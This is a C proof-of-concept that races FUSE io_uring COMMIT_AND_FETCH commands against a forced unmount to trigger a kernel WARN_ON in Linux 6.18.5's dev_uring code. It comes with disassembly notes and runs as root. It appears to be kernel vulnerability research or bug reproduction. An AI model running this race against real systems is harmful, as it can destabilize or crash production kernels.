/*
 * fuse_uring_race.c — commit_fetch vs teardown race PoC
 *
 * Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y
 * Requires: echo 1 > /sys/module/fuse/parameters/enable_uring
 * Run as root: ./fuse_uring_race
 *
 * PROTOCOL (from kernel source fs/fuse/dev_uring.c + disassembly)
 * ────────────────────────────────────────────────────────────────
 * 1. REGISTER SQE (cmd_op=1)
 *      ↳ kernel stores cmd ptr in ent->cmd, adds ent to queue->entry_list
 *      ↳ deferred: no immediate CQE
 * 2. FUSE op arrives → fuse_uring_task_to_queue(ring) maps current CPU to qid
 *      ↳ if queue[qid].entry_list is non-empty: dispatch immediately
 *      ↳ fuse_in_header written to iov[0].iov_base (in_buf[qid])
 *      ↳ io_uring_cmd_done(register_cmd, 0) → CQE on REGISTER SQE (res=0)
 * 3. Daemon reads fuse_in_header from in_buf[qid], gets commit_id = ih->unique
 * 4. Daemon writes fuse_out_header+body to out_buf[qid]
 * 5. COMMIT_AND_FETCH SQE (cmd_op=2, commit_id = unique, qid = same queue)
 *      ↳ kernel: fuse_request_find(queue+0x80, commit_id) → finds req
 *      ↳ asserts req->ring_ent->state == 4 (FRRS_USERSPACE)
 *      ↳ commits response, re-arms entry for next op
 *
 * QUEUE ROUTING (confirmed by disassembly of fuse_uring_task_to_queue):
 *      fuse_uring_task_to_queue(ring) uses current->thread_info.cpu % nr_queues
 *      nr_queues = num_online_cpus() at ring creation time = 4 on this system
 *      → MUST register one REGISTER SQE per queue (qid=0..nr_queues-1)
 *      → each queue needs its own in_buf / out_buf
 *
 * RACE TARGET (confirmed ud2 at 0xffffffff81701e86)
 * ─────────────────────────────────────────────────
 * fuse_uring_stop_list_entries (teardown, acquires queue+0xc spinlock):
 *   if ring_ent->state == FRRS_USERSPACE (4): transitions 4→5 (FRRS_STOPPED)
 *   does NOT remove req from queue->req_hash (queue+0x80)
 *
 * fuse_uring_commit_fetch (COMMIT_AND_FETCH handler, same spinlock):
 *   fuse_request_find(queue+0x80, commit_id) → finds req (still in hash)
 *   cmpl $0x4, ring_ent->state → jne ud2  ← if teardown already ran: UD2
 *
 * Compile: gcc -O2 -Wall -o fuse_uring_race fuse_uring_race.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <linux/fuse.h>
#include <linux/io_uring.h>
#include <linux/time_types.h>

/* -----------------------------------------------------------------------
 * FUSE io_uring protocol constants
 * ----------------------------------------------------------------------- */

#define FUSE_OVER_IO_URING              (1u << 9)   /* bit 9 of flags2 */
#define FUSE_IO_URING_CMD_REGISTER          1
#define FUSE_IO_URING_CMD_COMMIT_AND_FETCH  2

/* user_data for REGISTER SQEs: (REGISTER_BASE << 8) | qid */
#define REGISTER_BASE  0x5555ULL
#define REGISTER_TAG   (REGISTER_BASE << 8)   /* 0x555500 — lower byte = qid */
/* user_data tag for COMMIT_AND_FETCH SQE */
#define CAF_TAG        0xdeadULL

/* -----------------------------------------------------------------------
 * Minimal io_uring (no liburing)
 * ----------------------------------------------------------------------- */

struct uring {
    int      fd;
    uint32_t sq_entries, cq_entries;
    uint32_t sqe_size;
    uint32_t *sq_head, *sq_tail, *sq_mask, *sq_array;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_cqe *cqes;
    void *sqe_map; size_t sqe_sz;
    void *sq_map;  size_t sq_sz;
    void *cq_map;  size_t cq_sz;
};

static int uring_setup(struct uring *u, uint32_t n, uint32_t flags)
{
    struct io_uring_params p = { .flags = flags };
    u->fd = (int)syscall(SYS_io_uring_setup, n, &p);
    if (u->fd < 0) { perror("io_uring_setup"); return -1; }

    u->sq_entries = p.sq_entries;
    u->cq_entries = p.cq_entries;
    u->sqe_size   = (flags & IORING_SETUP_SQE128) ? 128 : 64;

    u->sqe_sz  = (size_t)p.sq_entries * u->sqe_size;
    u->sqe_map = mmap(NULL, u->sqe_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQES);
    if (u->sqe_map == MAP_FAILED) { perror("mmap sqes"); return -1; }

    u->sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    u->sq_map = mmap(NULL, u->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQ_RING);
    if (u->sq_map == MAP_FAILED) { perror("mmap sq"); return -1; }
    u->sq_head  = u->sq_map + p.sq_off.head;
    u->sq_tail  = u->sq_map + p.sq_off.tail;
    u->sq_mask  = u->sq_map + p.sq_off.ring_mask;
    u->sq_array = u->sq_map + p.sq_off.array;

    u->cq_sz  = p.cq_off.cqes + (size_t)p.cq_entries * sizeof(struct io_uring_cqe);
    u->cq_map = mmap(NULL, u->cq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_CQ_RING);
    if (u->cq_map == MAP_FAILED) { perror("mmap cq"); return -1; }
    u->cq_head = u->cq_map + p.cq_off.head;
    u->cq_tail = u->cq_map + p.cq_off.tail;
    u->cq_mask = u->cq_map + p.cq_off.ring_mask;
    u->cqes    = u->cq_map + p.cq_off.cqes;
    return 0;
}

static void uring_close(struct uring *u)
{
    if (u->sqe_map && u->sqe_map != MAP_FAILED) munmap(u->sqe_map, u->sqe_sz);
    if (u->sq_map  && u->sq_map  != MAP_FAILED) munmap(u->sq_map,  u->sq_sz);
    if (u->cq_map  && u->cq_map  != MAP_FAILED) munmap(u->cq_map,  u->cq_sz);
    if (u->fd >= 0) close(u->fd);
    u->fd = -1;
}

static struct io_uring_sqe *uring_get_sqe(struct uring *u)
{
    uint32_t idx = (*u->sq_tail) & (*u->sq_mask);
    u->sq_array[idx] = idx;
    return (struct io_uring_sqe *)((char *)u->sqe_map + idx * u->sqe_size);
}

static int uring_submit(struct uring *u, int n)
{
    __atomic_store_n(u->sq_tail, *u->sq_tail + (uint32_t)n, __ATOMIC_RELEASE);
    return (int)syscall(SYS_io_uring_enter, u->fd, n, 0, 0, NULL, 0);
}

/*
 * Block until one CQE arrives or timeout_ms elapses.
 *
 * CRITICAL: must use min_complete=1, NOT 0.
 *
 * fuse_uring_send_in_task is scheduled as io_uring task work via
 * __io_uring_cmd_do_in_task when a FUSE op is dispatched to the ring.
 * io_cqring_wait only processes pending task work in the wait loop —
 * it returns immediately at "events >= min_events" when min_events=0
 * (0 events are always available), never reaching the task_work check.
 * min_complete=1 forces the wait loop where task work is drained.
 *
 * IORING_ENTER_EXT_ARG + struct io_uring_getevents_arg provides the
 * deadline so we never block indefinitely when the child's stat() goes
 * to /dev/fuse fallback rather than the ring.
 */
static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
                               uint64_t *user_data_out)
{
    struct __kernel_timespec ts = {
        .tv_sec  = (long long)(timeout_ms / 1000),
        .tv_nsec = (long long)(timeout_ms % 1000) * 1000000LL,
    };
    struct io_uring_getevents_arg arg = {
        .sigmask    = 0,
        .sigmask_sz = _NSIG / 8,
        .pad        = 0,
        .ts         = (uint64_t)(uintptr_t)&ts,
    };

    syscall(SYS_io_uring_enter, u->fd, 0, 1,
            IORING_ENTER_GETEVENTS | IORING_ENTER_EXT_ARG,
            &arg, sizeof(arg));

    uint32_t h = __atomic_load_n(u->cq_head, __ATOMIC_ACQUIRE);
    uint32_t t = __atomic_load_n(u->cq_tail, __ATOMIC_ACQUIRE);
    if (h != t) {
        uint32_t idx = h & *u->cq_mask;
        int32_t  res = u->cqes[idx].res;
        if (user_data_out)
            *user_data_out = u->cqes[idx].user_data;
        __atomic_store_n(u->cq_head, h + 1, __ATOMIC_RELEASE);
        return res;
    }
    return -EAGAIN;
}

/* -----------------------------------------------------------------------
 * cmd_req layout in the 128-byte SQE (both REGISTER and COMMIT_AND_FETCH)
 *   sqe+48 = cmd[0]  = flags     (u64)
 *   sqe+56 = cmd[8]  = commit_id (u64)  ← kernel reads from sqe+0x38
 *   sqe+64 = cmd[16] = qid       (u32)  ← kernel reads from sqe+0x40
 * ----------------------------------------------------------------------- */
struct fuse_uring_cmd_req {
    uint64_t flags;
    uint64_t commit_id;
    uint32_t qid;
    uint32_t pad;
};

/* -----------------------------------------------------------------------
 * FUSE daemon state — shared between /dev/fuse thread and main
 * ----------------------------------------------------------------------- */

static int          gfuse_fd     = -1;
static volatile int gdaemon_stop = 0;
static volatile uint32_t gneg_flags2 = 0;
static volatile int gdaemon_getattr_count = 0;  /* counts GETATTRs via /dev/fuse */
static volatile int gdaemon_lookup_count  = 0;  /* counts FUSE_LOOKUP via /dev/fuse */
static volatile int gdaemon_default_count = 0;  /* counts any unhandled ops via /dev/fuse */

static void fuse_send(int fd, uint64_t unique, int err,
                      const void *body, size_t blen)
{
    struct fuse_out_header h = {
        .len    = (uint32_t)(sizeof(h) + blen),
        .error  = err,
        .unique = unique,
    };
    struct iovec iov[2] = { {&h, sizeof h}, {(void *)body, blen} };
    writev(fd, iov, body ? 2 : 1);
}

static void *fuse_devfuse_daemon(void *arg)
{
    int fd = *(int *)arg;
    char buf[1 << 17];

    while (!gdaemon_stop) {
        ssize_t n = read(fd, buf, sizeof buf);
        if (n <= 0) break;
        struct fuse_in_header *h = (struct fuse_in_header *)buf;
        char *body = buf + sizeof(*h);

        switch (h->opcode) {
        case FUSE_INIT: {
            struct fuse_init_in *in = (struct fuse_init_in *)body;
            struct fuse_init_out o  = {0};
            o.major     = 7;
            o.minor     = 39;
            o.max_write = 65536;
            o.flags     = in->flags & 0xFFFFFFFFu;
            if (in->flags & 0x40000000u) {      /* FUSE_INIT_EXT */
                o.flags2 = FUSE_OVER_IO_URING;
                __atomic_store_n(&gneg_flags2, o.flags2, __ATOMIC_RELEASE);
            }
            fuse_send(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_GETATTR: {
            int cnt = __atomic_add_fetch(&gdaemon_getattr_count, 1, __ATOMIC_SEQ_CST);
            if (cnt <= 5)
                fprintf(stderr, "  [daemon] FUSE_GETATTR #%d via /dev/fuse"
                        " nodeid=%llu unique=%llu\n",
                        cnt, (unsigned long long)h->nodeid,
                        (unsigned long long)h->unique);
            struct fuse_attr_out o = {0};
            o.attr_valid = 0;
            o.attr.ino   = h->nodeid;
            o.attr.nlink = 1;
            o.attr.mode  = (h->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
            fuse_send(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_LOOKUP: {
            int cnt = __atomic_add_fetch(&gdaemon_lookup_count, 1, __ATOMIC_SEQ_CST);
            if (cnt <= 10)
                fprintf(stderr, "  [daemon] FUSE_LOOKUP #%d via /dev/fuse"
                        " nodeid=%llu unique=%llu\n",
                        cnt, (unsigned long long)h->nodeid,
                        (unsigned long long)h->unique);
            fuse_send(fd, h->unique, -ENOENT, NULL, 0);
            break;
        }
        default: {
            int cnt = __atomic_add_fetch(&gdaemon_default_count, 1, __ATOMIC_SEQ_CST);
            if (cnt <= 10)
                fprintf(stderr, "  [daemon] opcode=%u via /dev/fuse #%d"
                        " nodeid=%llu unique=%llu\n",
                        h->opcode,
                        cnt,
                        (unsigned long long)h->nodeid,
                        (unsigned long long)h->unique);
            fuse_send(fd, h->unique, -ENOSYS, NULL, 0);
            break;
        }
        }
    }
    return NULL;
}

/* -----------------------------------------------------------------------
 * Ring-based response helper
 *
 * Writes a valid fuse_out_header+body to out_buf (iov[1].iov_base) for
 * the op described by *ih.  The kernel reads this during COMMIT_AND_FETCH.
 * ----------------------------------------------------------------------- */
static void ring_respond(const struct fuse_in_header *ih, void *out_buf)
{
    struct fuse_out_header *oh = (struct fuse_out_header *)out_buf;

    switch (ih->opcode) {
    case FUSE_GETATTR: {
        struct fuse_attr_out body = {0};
        body.attr_valid  = 1;
        body.attr.ino    = ih->nodeid;
        body.attr.nlink  = 1;
        body.attr.mode   = (ih->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
        oh->len   = (uint32_t)(sizeof(*oh) + sizeof(body));
        oh->error = 0;
        oh->unique = ih->unique;
        memcpy(oh + 1, &body, sizeof(body));
        break;
    }
    case FUSE_LOOKUP:
        oh->len    = sizeof(*oh);
        oh->error  = -ENOENT;   /* file doesn't exist — fine, just need a reply */
        oh->unique = ih->unique;
        break;
    case FUSE_STATFS: {
        struct fuse_statfs_out body = {0};
        body.st.blocks = 1000; body.st.bfree = 500;
        body.st.namelen = 255; body.st.bsize = 4096;
        oh->len   = (uint32_t)(sizeof(*oh) + sizeof(body));
        oh->error = 0;
        oh->unique = ih->unique;
        memcpy(oh + 1, &body, sizeof(body));
        break;
    }
    default:
        oh->len   = sizeof(*oh);
        oh->error = -ENOSYS;
        oh->unique = ih->unique;
        break;
    }
}

/* -----------------------------------------------------------------------
 * abort_thread_fn: triggers fuse_abort_conn via umount2(MNT_FORCE).
 *
 * Call chain: umount2(MNT_FORCE) → fuse_abort_conn
 *   → fuse_uring_abort_end_requests (0x817022d3): queue+0xa4 = 1  (NO spinlock)
 *   → fuse_uring_stop_queues → fuse_uring_stop_list_entries:
 *       state = 5 under queue+0xc spinlock, req STILL in req_hash.
 *
 * TOCTOU race target in fuse_uring_commit_fetch:
 *   (a) 0x81701cc4: movzbl 0xa4(%r13),%eax  — reads queue+0xa4 WITHOUT spinlock
 *   (b) 0x81701cde: call spin_lock           — acquire; memory barrier
 *   (c) 0x81701d31: cmpl $0x4,0x30(%rbx)    — check state under spinlock
 *
 * If abort_end_requests runs between (a) and (b):
 *   queue+0xa4 stale=0 in register (passes check), barrier at (b) makes
 *   state=5 visible, (c) sees state!=4 → jne 0x81701e86 (ud2 / WARN_ON).
 *   commit_fetch recovery path returns -EPROTO to caller.
 * ----------------------------------------------------------------------- */
struct abort_args {
    const char *mntdir;
    int         delay_ms;
};

static void *abort_thread_fn(void *arg)
{
    struct abort_args *a = arg;
    usleep((useconds_t)a->delay_ms * 1000);
    printf("[*] abort_thread: umount2(\"%s\", MNT_FORCE|MNT_DETACH)\n",
           a->mntdir);
    fflush(stdout);
    umount2(a->mntdir, MNT_FORCE | MNT_DETACH);
    printf("[*] abort_thread: done\n");
    fflush(stdout);
    return NULL;
}

/* -----------------------------------------------------------------------
 * submit_commit_and_fetch — commit a response and arm for next op.
 *
 * commit_id = ih->unique from the FUSE request we just processed.
 * slot_buf  = scratch buffer for internal use (sqe->addr).
 * ----------------------------------------------------------------------- */
static void submit_caf(struct uring *u, int fuse_fd,
                       void *slot_buf, uint64_t commit_id, uint32_t qid)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    memset(sqe, 0, 128);
    sqe->opcode    = IORING_OP_URING_CMD;
    sqe->fd        = fuse_fd;
    sqe->addr      = (uint64_t)(uintptr_t)slot_buf;
    sqe->len       = 1;
    sqe->cmd_op    = FUSE_IO_URING_CMD_COMMIT_AND_FETCH;
    sqe->user_data = CAF_TAG;
    struct fuse_uring_cmd_req *r = (struct fuse_uring_cmd_req *)((char *)sqe + 48);
    memset(r, 0, sizeof(*r));
    r->commit_id = commit_id;
    r->qid       = qid;
}

/* -----------------------------------------------------------------------
 * Main
 * ----------------------------------------------------------------------- */

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_DFL);  /* allow waitpid to work */

    printf("=== fuse_uring commit_fetch vs teardown race PoC ===\n");
    printf("Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y\n\n");

    /* 0. enable_uring sysctl */
    {
        int f = open("/sys/module/fuse/parameters/enable_uring", O_RDWR);
        if (f < 0) {
            fprintf(stderr, "[-] Cannot open enable_uring sysctl: %s\n",
                    strerror(errno));
            return 1;
        }
        char val = 0;
        read(f, &val, 1);
        if (val != 'Y' && val != '1') {
            write(f, "1", 1);
            printf("[+] Enabled enable_uring\n");
        } else {
            printf("[+] enable_uring already on\n");
        }
        close(f);
    }

    /* 1. Open /dev/fuse and mount */
    gfuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
    if (gfuse_fd < 0) { perror("open /dev/fuse"); return 1; }

    char mntdir[64];
    snprintf(mntdir, sizeof mntdir, "/tmp/fuse_race_%d", (int)getpid());
    mkdir(mntdir, 0755);

    char opts[256];
    snprintf(opts, sizeof opts,
             "fd=%d,rootmode=40755,user_id=%d,group_id=%d",
             gfuse_fd, (int)getuid(), (int)getgid());
    if (mount("fuse_race_test", mntdir, "fuse", 0, opts) < 0) {
        perror("mount fuse"); close(gfuse_fd); rmdir(mntdir); return 1;
    }
    printf("[+] Mounted FUSE at %s\n", mntdir);

    /* 2. Start /dev/fuse daemon — handles FUSE_INIT, negotiates FUSE_OVER_IO_URING */
    pthread_t dtid;
    pthread_create(&dtid, NULL, fuse_devfuse_daemon, &gfuse_fd);

    /* Wait for daemon to process FUSE_INIT (sent async by mount()). */
    usleep(200000);

    uint32_t f2 = __atomic_load_n(&gneg_flags2, __ATOMIC_ACQUIRE);
    if (!(f2 & FUSE_OVER_IO_URING)) {
        fprintf(stderr, "[-] FUSE_OVER_IO_URING not negotiated (flags2=0x%x)\n", f2);
        goto cleanup_mount;
    }
    printf("[+] FUSE_OVER_IO_URING negotiated (flags2=0x%x)\n", f2);

    /*
     * 3. Allocate per-queue in/out buffers.
     *
     * fuse_uring_task_to_queue(ring) maps current->thread_info.cpu % nr_queues
     * to a queue.  nr_queues = num_online_cpus() at ring creation = 4 here.
     * We must register one REGISTER SQE per queue so that FUSE ops from any
     * CPU find an available entry.  Each queue needs its own in_buf/out_buf
     * because they are written/read independently.
     *
     * REGISTER SQE user_data = REGISTER_TAG | qid so the CQE identifies
     * which queue's in_buf received the FUSE op.
     */
    const int    NQ     = (int)sysconf(_SC_NPROCESSORS_ONLN);
    const size_t in_sz  = 4096;
    const size_t out_sz = 128 * 1024;

    void **in_bufs  = calloc(NQ, sizeof(void *));
    void **out_bufs = calloc(NQ, sizeof(void *));
    struct iovec (*reg_iovs)[2] = calloc(NQ, sizeof(*reg_iovs));
    if (!in_bufs || !out_bufs || !reg_iovs) { perror("calloc"); goto cleanup_mount; }

    for (int q = 0; q < NQ; q++) {
        in_bufs[q]  = mmap(NULL, in_sz,  PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
        out_bufs[q] = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
                           MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
        if (in_bufs[q] == MAP_FAILED || out_bufs[q] == MAP_FAILED) {
            perror("mmap per-queue bufs"); goto cleanup_mount;
        }
        reg_iovs[q][0].iov_base = in_bufs[q];  reg_iovs[q][0].iov_len = in_sz;
        reg_iovs[q][1].iov_base = out_bufs[q]; reg_iovs[q][1].iov_len = out_sz;
    }

    /* Slot buffer for COMMIT_AND_FETCH sqe->addr (one is enough) */
    void *slot_buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                          MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (slot_buf == MAP_FAILED) { perror("mmap slot"); goto cleanup_mount; }

    printf("[+] nr_queues=%d, per-queue in/out bufs allocated\n", NQ);

    /* 4. Single race session: tight CAF cycling loop vs. concurrent abort */
    const int CAF_LIMIT = 500000;
    int caf_count = 0;
    int warn_hit  = 0;

    printf("[+] Setting up io_uring ring (SQE128, %d entries)...\n", NQ + 64);

    struct uring u = {0};
    if (uring_setup(&u, (uint32_t)(NQ + 64), IORING_SETUP_SQE128) < 0)
        goto cleanup_bufs;

    /*
     * Step A: REGISTER one entry per queue.
     * Submitted individually — each uring_submit() advances sq_tail so the
     * next uring_get_sqe() picks a distinct SQE slot (batch submit would
     * write all NQ SQEs to slot 0, silently losing queues 0..NQ-2).
     */
    for (int q = 0; q < NQ; q++) {
        memset(in_bufs[q], 0, in_sz);
        struct io_uring_sqe *sqe = uring_get_sqe(&u);
        memset(sqe, 0, 128);
        sqe->opcode    = IORING_OP_URING_CMD;
        sqe->fd        = gfuse_fd;
        sqe->addr      = (uint64_t)(uintptr_t)reg_iovs[q];
        sqe->len       = 2;
        sqe->cmd_op    = FUSE_IO_URING_CMD_REGISTER;
        sqe->user_data = REGISTER_TAG | (uint64_t)(unsigned char)q;
        struct fuse_uring_cmd_req *r =
            (struct fuse_uring_cmd_req *)((char *)sqe + 48);
        memset(r, 0, sizeof(*r));
        r->qid = (uint32_t)q;
        uring_submit(&u, 1);
    }
    usleep(20000);

    {
        uint32_t h = __atomic_load_n(u.cq_head, __ATOMIC_ACQUIRE);
        uint32_t t = __atomic_load_n(u.cq_tail, __ATOMIC_ACQUIRE);
        int reg_fail = 0;
        while (h != t) {
            int32_t  res = u.cqes[h & *u.cq_mask].res;
            uint64_t ud  = u.cqes[h & *u.cq_mask].user_data;
            fprintf(stderr, "[-] REGISTER qid=%llu immediate error res=%d\n",
                    (unsigned long long)(ud & 0xff), res);
            h++; reg_fail++;
        }
        __atomic_store_n(u.cq_head, h, __ATOMIC_RELEASE);
        if (reg_fail) {
            fprintf(stderr, "[-] %d REGISTER(s) failed\n", reg_fail);
            uring_close(&u);
            goto cleanup_bufs;
        }
    }
    printf("[+] All %d REGISTER SQEs accepted (deferred — no immediate CQE)\n", NQ);

    /*
     * Step B: Fork persistent child hammering stat() at ~10k ops/s.
     * stat() → FUSE_LOOKUP → fuse_uring_task_to_queue dispatches to ring
     * → fuse_uring_send_in_task writes fuse_in_header into in_buf[qid]
     * → fires CQE on the pending REGISTER (or later CAF) cmd.
     */
    char probe[128];
    snprintf(probe, sizeof probe, "%s/probe", mntdir);

    pid_t child = fork();
    if (child == 0) {
        struct stat st;
        while (1) {
            stat(probe, &st);
            usleep(100);   /* 100µs → ~10k FUSE ops/s */
        }
        _exit(0);
    }
    printf("[+] child pid=%d hammering stat(\"%s\")\n", (int)child, probe);

    /*
     * Step C: Wait for first REGISTER CQE — first FUSE op dispatched to ring.
     * user_data = REGISTER_TAG | qid identifies which queue fired.
     */
    uint64_t first_ud  = 0;
    int32_t  first_res = uring_poll_cqe(&u, 2000, &first_ud);

    fprintf(stderr, "  [init] CQE res=%d ud=0x%llx qid=%llu\n",
            first_res, (unsigned long long)first_ud,
            (unsigned long long)(first_ud & 0xff));

    if (first_res != 0 || (first_ud & ~0xffULL) != (REGISTER_BASE << 8)) {
        fprintf(stderr, "[-] Expected REGISTER CQE (ud high=0x%llx res=0), "
                "got res=%d ud=0x%llx\n",
                (unsigned long long)(REGISTER_BASE << 8),
                first_res, (unsigned long long)first_ud);
        kill(child, SIGKILL); waitpid(child, NULL, 0);
        uring_close(&u);
        goto cleanup_bufs;
    }

    int fired_q = (int)(first_ud & 0xffULL);
    struct fuse_in_header *ih = (struct fuse_in_header *)in_bufs[fired_q];
    uint64_t commit_id = ih->unique;

    fprintf(stderr, "  [init] qid=%d commit_id=%llu opcode=%u\n",
            fired_q, (unsigned long long)commit_id, ih->opcode);

    if (commit_id == 0) {
        fprintf(stderr, "[-] in_buf unique==0 — kernel did not write FUSE header\n");
        kill(child, SIGKILL); waitpid(child, NULL, 0);
        uring_close(&u);
        goto cleanup_bufs;
    }

    /* Step D: Write response for the first op (CAF loop consumes it). */
    ring_respond(ih, out_bufs[fired_q]);

    /*
     * Step E: concurrent abort vs. tight CAF cycling loop.
     *
     * abort_thread fires umount2(MNT_FORCE|MNT_DETACH) after delay_ms:
     *   fuse_abort_conn
     *     → fuse_uring_abort_end_requests: movb $1,0xa4(%rbx)  (no spinlock)
     *     → fuse_uring_stop_queues → fuse_uring_stop_list_entries:
     *         first loop (spinlock): ring_ent->state = 5, req kept in req_hash
     *         second loop (spinlock): removes req from req_hash, state = 6
     *
     * Main thread: each CAF iteration enters fuse_uring_commit_fetch:
     *   0x81701cc4: movzbl 0xa4(%r13),%eax   ← reads queue+0xa4 (NO spinlock)
     *   0x81701cce: jne → -ENODEV             ← normal abort path if flag=1
     *   0x81701cde: call spin_lock            ← memory barrier
     *   0x81701d31: cmpl $0x4,0x30(%rbx)     ← state check under spinlock
     *   0x81701d39: jne 0x81701e86           ← ud2 if state != 4
     *
     * Race: abort_end_requests writes queue+0xa4=1 between the movzbl (a)
     * and spin_lock (b).  On a preemptible kernel, a timer interrupt in that
     * ~30ns window lets the abort thread run fully (sets queue+0xa4=1 AND
     * state=5), then commit_fetch resumes with stale 0 in its register,
     * acquires spinlock, finds state=5 → WARN_ON at 0x81701e86.
     *
     * Distinguishing outcomes:
     *   CAF CQE res == -EPROTO  → WARN_ON path (race triggered)
     *   CAF CQE res == -ENODEV  → clean abort  (queue+0xa4 guard fired)
     *   CAF CQE res == -EAGAIN  → timeout (no FUSE op arrived in 500ms)
     */
    struct abort_args aargs = { .mntdir = mntdir, .delay_ms = 300 };
    pthread_t abort_tid;
    pthread_create(&abort_tid, NULL, abort_thread_fn, &aargs);

    printf("[+] CAF cycling loop started (abort fires in %dms, limit=%d)\n",
           aargs.delay_ms, CAF_LIMIT);
    fflush(stdout);

    for (int i = 0; i < CAF_LIMIT; i++) {
        submit_caf(&u, gfuse_fd, slot_buf, commit_id, (uint32_t)fired_q);
        uring_submit(&u, 1);
        caf_count++;

        uint64_t ud  = 0;
        int32_t  res = uring_poll_cqe(&u, 500, &ud);

        if (res == -EPROTO) {
            /*
             * commit_fetch recovery path: ud2 fired at 0x81701e86, then
             * spin_unlock → fuse_req->error=-EPROTO → fuse_request_end →
             * return -EPROTO → io_uring_cmd_done(cmd, -EPROTO) → this CQE.
             */
            printf("[!] *** WARN_ON TRIGGERED *** iter=%d CAF returned -EPROTO\n", i);
            printf("    ring_ent->state==5 seen under spinlock in commit_fetch\n");
            printf("    ud2 at 0xffffffff81701e86 fired — check dmesg for WARNING:\n");
            warn_hit = 1;
            break;
        }
        if (res != 0) {
            printf("[*] CAF loop ended: iter=%d res=%d (%s)\n", i, res,
                   res == -ENODEV ? "-ENODEV (clean abort, queue+0xa4 guard)" :
                   res == -EAGAIN ? "-EAGAIN (timeout)" :
                   res == -EINVAL ? "-EINVAL" : "other");
            break;
        }

        /* Next op arrived in in_buf; get its commit_id for the next CAF. */
        uint64_t new_id = ih->unique;
        if (new_id == 0 || new_id == commit_id) {
            usleep(50);
            new_id = ih->unique;
            if (new_id == 0 || new_id == commit_id)
                break;
        }
        commit_id = new_id;
        ring_respond(ih, out_bufs[fired_q]);
    }

    pthread_join(abort_tid, NULL);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    uring_close(&u);

    printf("\n[+] Race session complete\n");
    printf("    CAF iterations:    %d\n", caf_count);
    printf("    WARN_ON triggered: %s\n", warn_hit ? "YES" : "no");
    printf("\n");

    printf("  --- dmesg (last 30 lines) ---\n");
    system("dmesg 2>/dev/null | tail -30 | sed 's/^/  /'");
    printf("  --- end dmesg ---\n\n");

    printf("  FUSE/WARNING hits:\n");
    system("dmesg 2>/dev/null | grep -iE "
           "'WARNING:|fuse.*uring|ud2|invalid opcode|BUG:|KASAN' "
           "| tail -15 | sed 's/^/    /' || echo '    (none)'");
    printf("\n");

    if (warn_hit) {
        printf("[!] Race confirmed: fuse_uring_commit_fetch saw state=5 under "
               "spinlock.\n");
        printf("    WARN_ON at 0xffffffff81701e86 triggered.\n");
    } else {
        printf("[*] WARN_ON not triggered this run.\n");
        printf("    -ENODEV = queue+0xa4 guard always fired before spinlock.\n");
        printf("    Try: PREEMPT_DYNAMIC kernel, more CPUs, reduce abort delay.\n");
    }

cleanup_bufs:
    for (int q = 0; q < NQ; q++) {
        if (in_bufs[q]  && in_bufs[q]  != MAP_FAILED) munmap(in_bufs[q],  in_sz);
        if (out_bufs[q] && out_bufs[q] != MAP_FAILED) munmap(out_bufs[q], out_sz);
    }
    free(in_bufs); free(out_bufs); free(reg_iovs);
    if (slot_buf != MAP_FAILED) munmap(slot_buf, 4096);

cleanup_mount:
    gdaemon_stop = 1;
    umount2(mntdir, MNT_DETACH);   /* ignore EINVAL if abort_thread already unmounted */
    close(gfuse_fd);
    pthread_join(dtid, NULL);
    rmdir(mntdir);

    printf("[+] Done.\n");
    return 0;
}
